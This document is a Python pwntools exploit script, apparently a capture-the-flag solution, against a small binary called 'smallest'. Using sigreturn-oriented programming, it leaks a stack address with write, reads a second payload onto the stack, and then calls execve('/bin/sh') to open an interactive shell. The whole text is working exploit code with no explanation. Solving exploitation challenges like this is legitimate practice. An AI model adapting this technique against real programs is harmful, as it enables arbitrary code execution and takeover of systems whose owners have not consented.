from pwn import *

r=process('./smallest')
elf=ELF('smallest')
context.arch="amd64"
sigreturn=p64(0x4000be)+'C0ss4ck'

log.success('SYSCALL:WRITE')
SROP1=p64(0x4000b0)*3
r.send(SROP1)
r.send('\xb3')
leak0=u64(r.recv()[8:16].ljust(8,'\x00'))
log.info('write(1,something,0x400)')
log.warn('leak next_rsi='+str(hex(leak0)))

log.success('SYSCALL:READ')
SROP2=p64(0x4000b0)+'C0ss4ck!'
sFrame1=SigreturnFrame()
sFrame1.rax=constants.SYS_read
sFrame1.rdi=0
sFrame1.rsi=leak0
sFrame1.rdx=0x400
sFrame1.rsp=leak0
sFrame1.rip=0x4000be
SROP2+=str(sFrame1)
r.send(SROP2)
r.send(sigreturn)
log.info('read(0,stack,0x400)')

log.success('SYSCALL:EXECVE')
SROP4=p64(0x4000b0)+'C0ss4ck?'
sFrame2=SigreturnFrame()
sFrame2.rax=constants.SYS_execve
sFrame2.rdi=leak0+0x120
sFrame2.rsi=0x0
sFrame2.rdx=0x0
sFrame2.rsp=leak0
sFrame2.rip=0x4000be
SROP4+=str(sFrame2)
SROP4+=(0x120-len(SROP4))*'\x00'
SROP4+='/bin/sh\x00'
r.send(SROP4)
r.send(sigreturn)
log.info("execve('/bin/sh')")

r.interactive()
